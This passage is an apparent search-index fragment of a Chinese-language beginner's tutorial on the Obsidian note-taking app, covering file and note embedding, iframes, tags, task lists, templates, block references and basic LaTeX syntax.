<code>[\u6587\u672c](url)</code> \u6211\u4eec\u53ef\u4ee5\u5f88\u5bb9\u6613\u5730\u6784\u5efa\u4e00\u4e2a\u5916\u90e8\u94fe\u63a5\uff0c\u4f8b\u5982\u6211\u4eec\u4e0a\u9762\u5df2\u7ecf\u89c1\u8fc7\u7684 Markdown\u5b98\u65b9\u6559\u7a0b \u3002</p>","tags":["begin"]},{"location":"tutorial/begin/Obsidian_begin/#iii13","title":"III.1.3 \u53cd\u5411\u94fe\u63a5","text":"<p>\u5f00\u542f\u4e86 <code>\u6838\u5fc3\u63d2\u4ef6-\u53cd\u5411\u94fe\u63a5</code> \u540e\uff0c\u4f1a\u9ed8\u8ba4\u5728\u6587\u7ae0\u5e95\u90e8\u7ed9\u51fa\u5f53\u524d\u5f15\u7528\u8be5\u6587\u7ae0\u7684\u6765\u6e90\uff0c\u4f60\u53ef\u4ee5\u770b\u770b\u90a3\u91cc\u5f15\u7528\u4e86\u8fd9\u7bc7\u6587\u7ae0\u3002</p>","tags":["begin"]},{"location":"tutorial/begin/Obsidian_begin/#iii14","title":"III.1.4 \u5d4c\u5165\u6587\u4ef6","text":"<p>^id</p>","tags":["begin"]},{"location":"tutorial/begin/Obsidian_begin/#iii141","title":"III.1.4.1 \u56fe\u7247&amp;\u97f3\u9891","text":"<p>\u53ef\u4ee5\u5c06\u56fe\u7247\u6216\u8005\u97f3\u9891\u7b49\u9644\u4ef6\u5d4c\u5165\u5230\u4f60\u7684\u7b14\u8bb0\u4e2d</p> <p>\u5d4c\u5165\u6587\u4ef6\u7684\u8bed\u6cd5\u4e3a\u00a0<code>![[\u6587\u4ef6\u540d.\u6587\u4ef6\u6269\u5c55\u540d]]</code></p> <p></p> <p>\u62d6\u52a8\u56fe\u7247\u5230\u7b14\u8bb0\u4e2d\u65f6\uff0c\u56fe\u7247\u4f1a\u81ea\u52a8\u5d4c\u5165\u7b14\u8bb0\uff0c\u5e76\u4e14 Obsidian \u4f1a\u5c06\u56fe\u7247\u6587\u4ef6\u590d\u5236\u5230\u9ed8\u8ba4\u7684\u9644\u4ef6\u6587\u4ef6\u5939\u4e2d\uff1b\u914d\u5408 Paste image rename \u63d2\u4ef6\uff0c\u6211\u4eec\u53ef\u4ee5\u66f4\u52a0\u597d\u7684\u53bb\u6574\u7406\u56fe\u7247\u9644\u4ef6\u3002</p> <p>\u4e00\u822c\u7684\u5d4c\u5165\uff0c\u4f7f\u7528\u00a0<code>![[image.png|100x100]]</code>\u00a0\u8fd9\u6837\u7684\u8bed\u6cd5\u53ef\u4ee5\u63a7\u5236\u5927\u5c0f</p> <p>\u5982\u679c\u8981\u6839\u636e\u56fe\u50cf\u7684\u5bbd\u9ad8\u6bd4\u4f8b\u8fdb\u884c\u7f29\u653e\uff0c\u8bf7\u7701\u7565\u9ad8\u5ea6\uff0c\u5982\u00a0<code>![[image.png|100]]</code>\u3002</p> <p>\u4e00\u4e2a\u597d\u7528\u7684\u63d2\u4ef6\u662f mousewheel image zoom \u8ba9\u6211\u4eec\u53ef\u4ee5\u6eda\u52a8\u9f20\u6807\u6eda\u8f6e\u653e\u7f29\u56fe\u7247</p> <p></p>","tags":["begin"]},{"location":"tutorial/begin/Obsidian_begin/#iii142-pdf","title":"III.1.4.2 PDF","text":"<p>\u53ef\u4ee5\u901a\u8fc7\u76f8\u540c\u7684\u8bed\u6cd5\u5c06 PDF \u6587\u4ef6\u5d4c\u5165\u5230\u7b14\u8bb0\u4e2d</p> <p>\u9664\u6b64\u4e4b\u5916\uff0c\u53ef\u4ee5\u901a\u8fc7\u00a0<code>![[My File.pdf#page=number]]</code>\u00a0\u8fd9\u6837\u7684\u5f62\u5f0f\u76f4\u63a5\u6307\u5b9a\u5d4c\u5165 PDF \u6587\u4ef6\u7684\u9875\u7801</p>","tags":["begin"]},{"location":"tutorial/begin/Obsidian_begin/#iii143","title":"III.1.4.3 \u5d4c\u5165\u7b14\u8bb0","text":"<p><code>![Typst_begin](Typst_begin.md#\u57fa\u672c\u4ecb\u7ecd)</code> \u6548\u679c\u5982\u4e0b\uff08\u7f51\u7ad9\u4e0a\u4e0d\u4e00\u5b9a\u80fd\u591f\u663e\u793a\u6b63\u786e\u53ef\u4ee5\u5728 Obsidian \u4e2d\u81ea\u5df1\u5c1d\u8bd5\u65b0\u5efa\u53e6\u4e00\u4e2a\u6587\u6863\uff0c\u968f\u4fbf\u5199\u4e00\u70b9\u4e1c\u897f\uff0c\u7136\u540e\u5c06\u8def\u5f84\u4fee\u6539\u5373\u53ef\uff09\uff1a</p> <p></p>","tags":["begin"]},{"location":"tutorial/begin/Obsidian_begin/#iii144","title":"III.1.4.4 \u94fe\u63a5\u7b14\u8bb0","text":"<p>Obsidian URI\u00a0\u53ef\u4ee5\u8ba9\u4f60\u5728\u5176\u4ed6\u5e94\u7528\u6216 Obsidian \u7684\u5176\u4ed6\u5e93\u4e2d\u6253\u5f00\u5f53\u524d\u5e93\u7684\u67d0\u7bc7\u7b14\u8bb0\u3002</p> <p>\u6bd4\u5982\uff0c\u4f60\u53ef\u4ee5\u901a\u8fc7\u4ee5\u4e0b\u65b9\u5f0f\u8df3\u8f6c\u5230\u67d0\u4e2a\u5e93\u4e2d\u7684\u67d0\u7bc7\u7b14\u8bb0\uff08\u8bf7\u6ce8\u610f\u00a0URI \u7684\u7f16\u7801\uff09\uff1a</p> <p><code>[\u6253\u5f00\u67d0\u7bc7\u7b14\u8bb0](obsidian://open?path=D:%2Fpath%2Fto%2Ffile.md)</code></p> <p>tes</p>","tags":["begin"]},{"location":"tutorial/begin/Obsidian_begin/#iii145-iframe","title":"III.1.4.5 iframe","text":"<p>\u7531\u4e8e Markdown \u517c\u5bb9 HTML\uff0c\u56e0\u6b64\u4f60\u53ef\u4ee5\u4f7f\u7528\u201ciframe\u201d\u5c06\u7f51\u9875\u5d4c\u5165\u5230\u7b14\u8bb0\u4e2d\uff0c\u6548\u679c\u5982\u4e0b</p> <p>Attention</p> <p>\u6211\u8ba4\u4e3a\u5728 obsidian \u4e2d\uff0c\u66f4\u597d\u7684\u65b9\u6cd5\u8fd8\u662f\u76f4\u63a5\u653e\u8d85\u94fe\u63a5\uff0c\u5e76\u4e14\u6309\u4f4f <code>Ctrl</code> \u5c06\u9f20\u6807\u653e\u5728\u94fe\u63a5\u4e0a\u5c31\u80fd\u9884\u89c8\u3002</p> <p> </p> <p>\u4e00\u4e9b\u7f51\u7ad9\u5e76\u4e0d\u5141\u8bb8\u4f60\u76f4\u63a5\u5d4c\u5165\u5b83\u4eec\u7684\u9875\u9762\u3002\u6bd4\u5982\uff0c\u4f60\u5c31\u4e0d\u80fd\u901a\u8fc7 YouTube \u89c6\u9891\u9875\u9762\u7684 URL \u6765\u5d4c\u5165\u8be5\u9875\u9762\u3002\u4f46\u662f\uff0c\u8fd9\u4e9b\u7f51\u7ad9\u4e00\u822c\u90fd\u63d0\u4f9b\u4e86\u7528\u4e8e\u5d4c\u5165\u7684 URL\uff0c\u6bd4\u5982\u4f60\u53ef\u4ee5\u901a\u8fc7\u00a0<code>https://www.youtube.com/embed/VIDEO_ID</code>\u00a0\u8fd9\u6837\u7684\u4e13\u7528 URL \u6765\u5d4c\u5165 YouTube \u7684\u89c6\u9891\u9875\u9762\u3002</p> <p>\u5982\u679c\u4f60\u60f3\u5d4c\u5165\u4e00\u4e2a\u7f51\u7ad9\uff0c\u53ef\u4ee5\u5c1d\u8bd5\u5728\u641c\u7d22\u5f15\u64ce\u4e0a\u00a0<code>{\u7f51\u9875\u540d} \u5d4c\u5165 iframe</code>\u00a0\u7b49\u5173\u952e\u8bcd\uff0c\u8fd9\u6837\u80fd\u5e2e\u52a9\u4f60\u66f4\u5feb\u901f\u7684\u5d4c\u5165\u67d0\u4e2a\u7f51\u7ad9\u3002</p> <p>\u6bd4\u5982\uff0c\u4f60\u53ef\u4ee5\u5229\u7528\u641c\u7d22\u7ed3\u679c\u7ed9\u51fa\u7684\u4ee3\u7801\u5feb\u901f\u63d2\u5165 Twitter\uff1a</p> <pre><code>&lt;iframe\n    border=0\n    frameborder=0\n    height=250\n    width=550  \n    src=\"https://twitframe.com/show?url=https%3A%2F%2Ftwitter.com%2Fjack%2Fstatus%2F20\"&gt;\n&lt;/iframe&gt;\n</code></pre>","tags":["begin"]},{"location":"tutorial/begin/Obsidian_begin/#iii2","title":"III.2 \u521b\u5efa\u8868\u683c","text":"<p><code>Ctrl+T</code> \u521b\u5efa\u8868\u683c\uff0c<code>ctrl+\u65b9\u5411\u952e</code> \u589e\u52a0\u8868\u683c\uff08\u8fd9\u662f\u81ea\u5df1\u8bbe\u7f6e\u7684\uff09\u5176\u4f59\u6162\u6162\u63a2\u7d22</p> Header1 Header2 Content Content","tags":["begin"]},{"location":"tutorial/begin/Obsidian_begin/#iii3","title":"III.3 \u6807\u7b7e","text":"<p>\u52a0\u4e0a\u6807\u7b7e\u65e0\u7591\u80fd\u4f7f\u7684\u6211\u4eec\u5bfb\u627e\u7b14\u8bb0\u66f4\u52a0\u65b9\u4fbf</p> <p>\u65e2\u53ef\u4ee5\u968f\u65f6\u968f\u5730 <code>#\u6807\u7b7e</code> \uff08\u6ce8\u610f\u65e0\u7a7a\u683c\uff09\u8bbe\u7acb\u6807\u7b7e\uff0c\u53c8\u53ef\u4ee5\u50cf\u672c\u6587\u4e00\u6837\u5728\u5f00\u5934\u52a0\u4e0a \u6587\u6863\u5c5e\u6027</p> <p>\u540c\u65f6\u53ef\u4ee5 <code>#tag/subtag</code> \u7684\u5f62\u5f0f\u6784\u5efa\u5b50\u6807\u7b7e\uff0c\u8fd8\u662f\u5f88\u65b9\u4fbf\u7684</p> <p>\u7531\u4e8e\u6211\u6362\u6389\u4e86\u5feb\u6377\u952e\uff0c\u53ea\u80fd <code>ctrl+shift+p</code> \u547c\u51fa\u9762\u677f\u540e\u641c\u7d22\u653e\u51fa\u6807\u7b7e\u5217\u8868\u4e86</p>","tags":["begin"]},{"location":"tutorial/begin/Obsidian_begin/#iii4","title":"III.4 \u5173\u7cfb\u56fe\u8c31","text":"<p>\u5728\u7b14\u8bb0\u591a\u4e86\u540e\u6587\u7ae0\u4e4b\u95f4\u76f8\u4e92\u94fe\u63a5\u5f62\u6210\u7684\u56fe\u8c31\uff0c\u5de6\u4fa7\u7c7b\u4f3c\u4e8e <code>fork</code> \u7684\u56fe\u6807\u65e2\u662f\uff0c\u8fd8\u53ef\u5728\u53f3\u4e0a\u65b9\u4e09\u70b9\u51fa\u6253\u5f00\u4e0e\u672c\u6587\u76f4\u63a5\u76f8\u5173\u7684\u5c40\u90e8\u56fe\u8c31</p>","tags":["begin"]},{"location":"tutorial/begin/Obsidian_begin/#iii5","title":"III.5 \u4efb\u52a1\u5217\u8868","text":"<pre><code>- [x] \u652f\u6301 #\u6807\u7b7e \uff0c[\u94fe\u63a5]()\uff0c**\u6837\u5f0f**\n- [x] \u8981\u6c42\u5305\u542b\u5217\u8868\u6807\u5fd7\uff08\u6709\u5e8f\u8868\u65e0\u5e8f\u8868\u5747\u53ef\uff0c\u6bd4\u5982 `1.[x]` \u540c\u6837\u53ef\u4ee5\uff09\n- [x] \u8fd9\u662f\u4e00\u4e2a\u5df2\u7ecf\u5b8c\u6210\u7684\u9879\u76ee\n- [?] \u8fd9\u4e5f\u662f\u4e00\u4e2a\u5df2\u5b8c\u6210\u7684\u9879\u76ee\uff08\u5b9e\u9645\u4e0a\u4f60\u53ef\u4ee5\u5728\u5176\u4e2d\u4f7f\u7528\u4efb\u4f55\u5b57\u7b26\uff09\n- [ ] \u8fd9\u662f\u4e00\u4e2a\u672a\u5b8c\u6210\u7684\u9879\u76ee\n- [ ] \u5728\u9884\u89c8\u6a21\u5f0f\u4e0b\u5355\u51fb\u9009\u6846\u53ef\u4ee5\u5207\u6362\u9879\u76ee\u5b8c\u6210\u72b6\u6001\n</code></pre> <ul> <li> \u652f\u6301\u00a0#tag\u00a0\uff0c\u94fe\u63a5\uff0c\u6837\u5f0f</li> <li> \u8981\u6c42\u5305\u542b\u5217\u8868\u6807\u5fd7\uff08\u6709\u5e8f\u8868\u65e0\u5e8f\u8868\u5747\u53ef\uff0c\u6bd4\u5982\u00a0<code>1.[x]</code>\u00a0\u540c\u6837\u53ef\u4ee5\uff09</li> <li> \u8fd9\u662f\u4e00\u4e2a\u5df2\u7ecf\u5b8c\u6210\u7684\u9879\u76ee</li> <li> \u8fd9\u4e5f\u662f\u4e00\u4e2a\u5df2\u5b8c\u6210\u7684\u9879\u76ee\uff08\u5b9e\u9645\u4e0a\u4f60\u53ef\u4ee5\u5728\u5176\u4e2d\u4f7f\u7528\u4efb\u4f55\u5b57\u7b26\uff09</li> <li> \u8fd9\u662f\u4e00\u4e2a\u672a\u5b8c\u6210\u7684\u9879\u76ee</li> <li> \u5728\u9884\u89c8/\u9605\u8bfb\u6a21\u5f0f\u4e0b\u5355\u51fb\u9009\u6846\u53ef\u4ee5\u5207\u6362\u9879\u76ee\u5b8c\u6210\u72b6\u6001</li> </ul> <p>\u4f7f\u7528 Minimal \u4e3b\u9898\u6211\u53d1\u73b0\u6709\u66f4\u52a0\u82b1\u54e8\u7684\u7528\u6cd5\uff0c\u6211\u7528\u5b83\u6765\u5217\u4e3e\u81ea\u5df1\u6bcf\u5929\u5e72\u4e86\u4ec0\u4e48\u4e8b\u60c5\uff0c\u76f8\u5f53\u4e8e\u4e00\u4e2a\u603b\u7ed3\u5427\u3002</p> <pre><code>- [*] \u8fd9\u662f\u4e00\u4e2a\u8f83\u6709\u610f\u4e49\u7684\u9879\u76ee \n- [x] \u8fd9\u662f\u4e00\u4e2a\u5df2\u7ecf\u5b8c\u6210\u7684\u9879\u76ee\n- [/] \u8fd9\u662f\u4e00\u4e2a\u6709\u5f85\u7ee7\u7eed\u7684\u9879\u76ee\n- [?] \u8fd9\u662f\u4e00\u4e2a\u5b58\u5728\u95ee\u9898\u7684\u9879\u76ee\n- [!] \u8fd9\u662f\u4e00\u4e2a\u5341\u5206\u91cd\u8981\u7684\u9879\u76ee\n- [\"] \u8fd9\u662f\u4e00\u4e2a\u6709\u6240\u53d7\u76ca\u7684\u9879\u76ee\n- [-] \u8fd9\u662f\u4e00\u4e2a\u65e0\u5173\u7d27\u8981\u7684\u9879\u76ee\n- [&lt;] \u8fd9\u662f\u4e00\u4e2a\u516c\u4e8b\u516c\u529e\u7684\u9879\u76ee\n- [&gt;] \u8fd9\u662f\u4e00\u4e2a\u4f11\u95f2\u5a31\u4e50\u7684\u9879\u76ee\n- [ ] \u8fd9\u662f\u4e00\u4e2a\u5c1a\u672a\u5f00\u59cb\u7684\u9879\u76ee\n</code></pre> <p></p>","tags":["begin"]},{"location":"tutorial/begin/Obsidian_begin/#iii6","title":"III.6 \u811a\u6ce8","text":"<p>\u811a\u6ce8\u7684\u7528\u6cd5\u5f88\u7b80\u5355\uff0c\u53ea\u9700\u8981\u5728\u6bb5\u843d\u4e2d\u9700\u8981\u63d2\u5165\u811a\u6ce8\u7684\u5730\u65b9\u6807\u6ce8\u4e00\u4e2a\u7b26\u53f7\uff0c\u518d\u5728\u6bb5\u843d\u540e\u5bf9\u8fd9\u4e2a\u7b26\u53f7\u8fdb\u884c\u89e3\u91ca\u5373\u53ef\u3002\u6bd4\u5982\u8fd9\u662f\u4e00\u4e2a\u7b80\u5355\u7684\u811a\u6ce8\uff0c<sup>1</sup> \u8fd9\u662f\u4e00\u4e2a\u957f\u4e00\u4e9b\u7684\u811a\u6ce8\u3002<sup>2</sup></p>","tags":["begin"]},{"location":"tutorial/begin/Obsidian_begin/#iii7","title":"III.7 \u6587\u4ef6\u5927\u7eb2\uff08\u76ee\u5f55\uff09","text":"<p>\u8bbe\u7f6e\u4e3a <code>ctrl+o</code> \u6253\u5f00\u672c\u6587\u5927\u7eb2\uff08outline\uff09\uff0c\u987a\u4fbf\u4e5f\u80fd\u770b\u770b\u6807\u7b7e</p>","tags":["begin"]},{"location":"tutorial/begin/Obsidian_begin/#iii8","title":"III.8 \u6a21\u677f","text":"<p>\u9996\u5148\u6211\u4eec\u5728\u6838\u5fc3\u63d2\u4ef6 <code>\u6a21\u677f</code> \u4e2d\u53ef\u4ee5\u770b\u89c1\u6211\u4eec\u6a21\u677f\u7684\u6587\u4ef6\u5939\u540d\uff08\u6211\u8bbe\u7f6e\u4e3a <code>templates</code>\uff09</p> <p>\u63a5\u7740\u5728\u5176\u4e2d\u8bbe\u7acb\u53ef\u80fd\u4f1a\u5e38\u7528\u7684\u6a21\u677f\u3002</p> <p>\u4f8b\u5982\u6211\u521b\u5efa\u535a\u5ba2\u6a21\u677f\uff1a</p> blog<pre><code>---\ndate: \"{{date:YYYY-MM-DD}}\"\ntags:\n- begin\n---\n***\n&lt;!-- more --&gt;\n</code></pre> <p>\u90a3\u4e48\u5f53\u6211\u5199\u535a\u5ba2\u6587\u7ae0\u65f6\uff0c\u5c31\u53ef\u4ee5\u70b9\u5de6\u8fb9\u7684 <code>\u6a21\u677f</code> \u5f15\u5165\uff0c\u5f15\u5165\u540e\u5c31\u4f1a\u5c06\u6a21\u677f\u4e2d\u7684\u4ee3\u7801\u590d\u5236\u5230\u6b64\u5904\u3002</p>","tags":["begin"]},{"location":"tutorial/begin/Obsidian_begin/#iii9","title":"III.9 \u65e5\u8bb0","text":"<p>\u70b9\u51fb\u5de6\u65b9\u7684 <code>\u65e5\u8bb0</code> \uff0c\u9009\u62e9\u6a21\u677f\uff0c\u5c31\u53ef\u4ee5\u5f00\u59cb\u8bb0\u4e0b\u65e5\u8bb0\u4e86\u3002</p>","tags":["begin"]},{"location":"tutorial/begin/Obsidian_begin/#iii10","title":"III.10 \u7b14\u8bb0\u91cd\u7ec4","text":"<p>\u4e3b\u8981\u7528\u9014\u5c31\u662f\u5c06\u7b14\u8bb0\u8fdb\u884c\u5408\u5e76\u3001\u90e8\u5206\u79fb\u690d\u7b49\u64cd\u4f5c\uff0c\u5177\u4f53\u770b \u5b98\u65b9\u7684\u6559\u7a0b \u3002</p>","tags":["begin"]},{"location":"tutorial/begin/Obsidian_begin/#iii11-ppt","title":"III.11 PPT","text":"<p>\u5373\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528 <code>---</code> \u5206\u9694\u7b14\u8bb0\u5185\u5bb9\uff0c\u4e4b\u540e\u6253\u5f00\u547d\u4ee4\u9762\u677f\uff0c\u8f93\u5165 \u201c\u5e7b\u706f\u7247\u201d \u5e76\u9009\u4e2d\uff0c\u5219\u53ef\u4ee5\u8fdb\u5165\u4e00\u4e2a\u7b80\u6613\u7684\u5e7b\u706f\u7247\u60c5\u666f\u3002</p>","tags":["begin"]},{"location":"tutorial/begin/Obsidian_begin/#iii12_1","title":"III.12 \u5757\u94fe\u63a5\u4e0e\u5757\u5f15\u7528","text":"","tags":["begin"]},{"location":"tutorial/begin/Obsidian_begin/#iii121","title":"III.12.1 \u5757\u94fe\u63a5","text":"<p>\u94fe\u63a5\u67d0\u4e2a\u7b14\u8bb0\u6587\u4ef6\u4e2d\u7684\u5757\uff0c\u4f60\u9996\u5148\u9700\u8981\u8f93\u5165\u00a0<code>[[\u6587\u4ef6\u540d</code>\u00a0\u6765\u5524\u8d77\u5f39\u7a97\uff0c\u5728\u9009\u62e9\u76f8\u5e94\u7684\u6587\u4ef6\u540e\uff0c\u901a\u8fc7\u8f93\u5165\u00a0<code>^</code>\u00a0\u8fdb\u5165\u5757\u9009\u62e9\u754c\u9762\u3002\u968f\u540e\uff0c\u4f60\u9700\u8981\u7ee7\u7eed\u8f93\u5165\u5173\u952e\u8bcd\u6765\u9009\u62e9\u4f60\u6240\u9700\u8981\u94fe\u63a5\u7684\u5757\u3002</p> <p>\u9009\u62e9\u597d\u4e86\u4ee5\u540e\uff0c\u6309\u4e0b\u56de\u8f66\u952e\uff0c\u5bf9\u4e8e\u8be5\u5757\u7684\u94fe\u63a5\u5c31\u521b\u5efa\u597d\u4e86\u3002\u5757\u94fe\u63a5\u4f1a\u4ee5\u00a0<code>[[filename#^dcf64c]]</code>\u00a0\u7684\u5f62\u5f0f\u51fa\u73b0\uff0c\u5176\u4e2d\u00a0<code>dcf64c</code>\u00a0\u5219\u662f\u4f60\u6240\u94fe\u63a5\u7684\u5757\u7684 ID\u3002</p> <p>\u5982\u679c\u4f60\u5fd8\u4e86\u60f3\u94fe\u63a5\u7684\u5757\u5728\u54ea\u4e2a\u6587\u4ef6\u91cc\uff0c\u4f60\u53ef\u4ee5\u901a\u8fc7\u8f93\u5165\u00a0<code>[[^^</code>\u00a0\u5728\u5e93\u7684\u6240\u6709\u7b14\u8bb0\u6587\u4ef6\u4e2d\u67e5\u627e\u8be5\u5757\u3002\u7531\u4e8e\u8fd9\u79cd\u67e5\u627e\u65b9\u5f0f\u6d89\u53ca\u5e93\u4e2d\u6240\u6709\u7b14\u8bb0\u6587\u4ef6\uff0c\u5f53\u4f60\u7684\u5e93\u5f88\u5927\u65f6\uff0c\u67e5\u627e\u5c31\u9700\u8981\u82b1\u8d39\u4e00\u4e9b\u65f6\u95f4\u3002</p> <p>\u6bd4\u5982\uff0c\u70b9\u51fb\u8fd9\u91cc \u53ef\u4ee5\u94fe\u63a5\u5230\u524d\u6587\u7684\u6bb5\u843d\u3002</p>","tags":["begin"]},{"location":"tutorial/begin/Obsidian_begin/#iii122","title":"III.12.2 \u5757\u5f15\u7528","text":"<p>\u4e0e\u5d4c\u5165\u6587\u4ef6\u4e00\u6837\uff0c\u4f60\u53ef\u4ee5\u901a\u8fc7\u5728\u5757\u94fe\u63a5\u524d\u52a0\u4e0a\u00a0<code>!</code>\u00a0\u6765\u8fdb\u884c\u5757\u5f15\u7528\uff0c\u5373\u5757\u7684\u5d4c\u5165\u3002</p> <p>\u6bd4\u5982\u524d\u9762\u7528\u7684 <code>![Typst_begin](Typst_begin.md#\u57fa\u672c\u4ecb\u7ecd)</code>\u3002</p> <p>\u4e00\u4e2a\u5757\u53ef\u4ee5\u662f\u4e00\u4e2a\u6bb5\u843d\u3001\u4e00\u4e2a\u5f15\u7528\u3001\u4e00\u4e2a\u5217\u8868\u7b49\u7b49\u3002\u4e00\u822c\u6765\u8bf4\uff0c\u524d\u540e\u6709\u7a7a\u884c\u5305\u56f4\u7684\u4e1c\u897f\u5c31\u662f\u5757\u3002</p>","tags":["begin"]},{"location":"tutorial/begin/Obsidian_begin/#iii123-id","title":"III.12.3 \u624b\u52a8\u521b\u5efa\u5757 ID","text":"<p>\u5982\u679c\u4f60\u60f3\u624b\u52a8\u521b\u5efa\u53ef\u8bfb\u6027\u5f3a\u7684\u5757 ID\uff0c\u4f60\u53ef\u4ee5\u5728\u5757\u7684\u672b\u5c3e\u624b\u52a8\u52a0\u4e0a\u00a0<code>^\u4f60\u7684-id</code>\u00a0\u8fd9\u6837\u7684\u8bed\u6cd5\u3002\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u5bf9\u4e8e\u4e00\u822c\u7684\u6bb5\u843d\uff0c\u624b\u52a8\u521b\u5efa\u7684 ID \u548c\u5757\u6700\u540e\u4e00\u4e2a\u5b57\u7b26\uff08\u5373\u6bb5\u843d\u6700\u540e\u4e00\u4e2a\u5b57\u7b26\uff09\u95f4\u9700\u8981\u6709\u4e00\u4e2a\u6216\u591a\u4e2a\u7a7a\u683c\u3002</p> <p>\u5982\u679c\u60f3\u4e3a\u8868\u683c\u8fd9\u6837\u6bd4\u8f83\u590d\u6742\u7684\u5757\u624b\u52a8\u521b\u5efa ID\uff0c\u4f60\u9700\u8981\u5c06\u624b\u52a8\u521b\u5efa\u7684 ID \u653e\u7f6e\u5728\u8be5\u5757\u4e4b\u540e\uff0c\u540c\u65f6\u786e\u4fdd\u624b\u52a8\u521b\u5efa\u7684\u5757 ID \u524d\u540e\u90fd\u662f\u7a7a\u884c\u3002</p> <p>\u6bd4\u5982\uff1a</p> header1 header2 1 2 <p>^table1</p> <p></p> <p>\u5f53\u4f60\u624b\u52a8\u521b\u5efa\u4e86\u5757 ID \u540e\u518d\u94fe\u63a5\u6216\u5f15\u7528\u8be5\u5757\u65f6\uff0cObsidian \u4f1a\u81ea\u52a8\u4f7f\u7528\u4f60\u624b\u52a8\u521b\u5efa\u7684\u5757 ID \u800c\u4e0d\u662f\u968f\u673a\u751f\u6210\u7684\u5757 ID\u3002</p> <p>\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u624b\u52a8\u521b\u5efa\u7684\u5757 ID \u4ec5\u652f\u6301\u5b57\u6bcd\u3001\u6570\u5b57\u3001\u7834\u6298\u53f7\u3002</p>","tags":["begin"]},{"location":"tutorial/begin/Obsidian_begin/#iii13-latex","title":"III.13 LaTeX","text":"<p>\u6211\u4eec\u4f7f\u7528 <code>$ $</code> \u5305\u88f9\u6570\u5b66\u516c\u5f0f\u6765\u8ba9\u5176\u66f4\u52a0\u7f8e\u89c2</p> <p>\u4f8b\u5982\uff0c<code>$a^2 + b^2 =c^2$</code> \u7684\u6548\u679c\u5c31\u662f</p> <p>\\(a^2 + b^2 =c^2\\)  \u6ce8\u610f\uff0c\u7a7a\u683c\u4f1a\u88ab\u5ffd\u7565</p> <p>\u4e0b\u9762\u6211\u4eec\u5c06\u653e\u7f6e\u4e00\u4e9b\u57fa\u672c\u7684 LaTeX \u8bed\u6cd5</p>","tags":["begin"]},{"location":"tutorial/begin/Obsidian_begin/#iii131","title":"III.13.1 \u7b26\u53f7\u7c7b","text":"<ul> <li><code>%</code> \u8868\u793a\u6ce8\u91ca\uff0c\u76f8\u4fe1\u4e0d\u96be\u7406\u89e3\u6ce8\u91ca\u662f\u4ec0\u4e48\u610f\u601d</li> <li><code>$</code> \u5305\u88f9\u6570\u5b66\u516c\u5f0f</li> <li><code>^</code> \u8868\u793a\u4e0a\u6807\uff0c\u7c7b\u6307\u6570</li> <li><code>_</code> \u8868\u793a\u4e0b\u6807\uff0c\u7c7b\u5e95\u6570</li> <li> <p><code>{}</code> \u7528\u4e8e\u5c06\u5185\u5bb9\u5305\u88f9\uff0c\u4fbf\u5f0f\u5c06\u516c\u5f0f\u4e00\u4f53\u5316</p> <p>\uff08\u4f8b\u5982\uff0c<code>$F_n = F_{n-1} + F_{n-2}$</code> \u5c31\u662f \\(F_n = F_{n-1} + F_{n-2}\\) \u6837\u7684\uff09</p> </li> </ul>","tags":["begin"]},{"location":"tutorial/begin/Obsidian_begin/#iii132","title":"III.13.2 \u547d\u4ee4","text":"<p>LaTeX \u4e3a\u4e86\u66f4\u597d\u5730\u8f93\u51fa\u952e\u76d8\u4e0a\u6240\u6ca1\u6709\u7684\u7b26\u53f7\uff08\u4f8b\u5982 \u03b1\u3001\u03b2 \uff08\u6b64\u5904\u4f7f\u7528\u5fae\u8f6f\u8f93\u5165\u6cd5\u6253\u51fa\u6765\u7684\uff09\uff0c\u5c31\u50cf\u6211\u4eec\u4f7f\u7528\u7684\u4e2d\u6587\u8f93\u5165\u6cd5\u4e00\u6837\u7ed9\u5b83\u4eec\u5b9a\u4e49\u4e86\u4e00\u5957\u547d\u4ee4</p> <p>\u6bd4\u65b9\u8bf4\uff0c\u6211\u4eec\u5728 LaTeX \u4e2d\u53ea\u9700\u7528\u7c7b\u4f3c\u4e8e <code>\\mu</code> \u7684\u547d\u4ee4\u5373\u53ef\u8f93\u51fa <code>\u03bc</code> \u8fd9\u4e00\u7b26\u53f7\u5e76\u4e14\u53ef\u4e0e\u4e0a\u8ff0\u7684\u4e0a\u4e0b\u89d2\u6807\u76f8\u517c\u5bb9</p> <p>\u5728 List_of_LaTeX_mathematical_symbols \u4e2d\u53ef\u4ee5\u770b\u5230\u51e0\u4e4e\u8be6\u5c3d\u7684\u547d\u4ee4\uff0c\u6b64\u5904\u5217\u51fa\u5fae\u79ef\u5206\u4e2d\u5e38\u7528\u7684\u7b26\u53f7\uff1b\u8fd9\u91cc \u662f\u4e00\u4e2a PDF \u7248\u3002</p> \\[ -\\alpha -A -\\beta -B -\\gamma -\\Gamma -\\delta -\\Delta -\\epsilon -\\varepsilon -\\zeta -\\eta -\\theta -\\vartheta -\\iota -\\kappa -\\Theta  -\\lambda -\\Lambda -\\mu -\\nu -\\xi -\\Xi -\\pi -\\Pi -o -O -\\rho -\\sigma -\\Sigma -\\tau -\\phi -\\varphi -\\Phi -\\chi -\\psi -\\Psi -\\omega -\\Omega \\] \\[ -\\triangle -\\pm -\\mp -\\int  \\, dx -\\sin -\\cos -\\arcsin -\\arccos -\\infty -\\to -\\lim_{ n \\to \\infty }  -\\int_{-\\infty}^{\\infty}  \\, dx  \\, dx  -\\ln -\\lg -\\log \\]","tags":["begin"]},{"location":"tutorial/begin/Obsidian_begin/#iii133","title":"III.13.3 \uff08\u4e0d\uff09\u7b49\u5f0f","text":"<p>\u5982\u679c\u6211\u4eec\u60f3\u8981\u8f93\u51fa\u5927\u4e14\u590d\u6742\u7684\uff08\u4e0d\uff09\u7b49\u5f0f\uff0c\u6211\u4eec\u53ef\u4ee5\u501f\u52a9<code>\\begin{equation} &amp; \\end{equation}</code> \u5305\u88f9\uff0c\u4f7f\u4e4b\u66f4\u4e3a\u7a81\u51fa</p> <p>\u8fd9\u662f\u884c\u5185\u516c\u5f0f  \\(x = \\frac{-b \\pm \\sqrt{b^2 - 4 ac}} {2 a}\\) \uff08\u4e2a\u4eba\u7ecf\u9a8c\uff0c\u5728 obsidian \u4e2d <code>$</code> \u7b26\u53f7\u4e0e\u6570\u5b66\u516c\u5f0f\u7d27\u8d34\uff0c\u4e0e\u5468\u8fb9\u6587\u5b57\u7a7a\u4e00\u683c\u4e3a\u4f73\uff09</p> <p>\u8fd9\u662f\u884c\u95f4\u516c\u5f0f</p> \\[ x = \\frac{-b \\pm \\sqrt{b^2 - 4ac}} {2a}  \\] 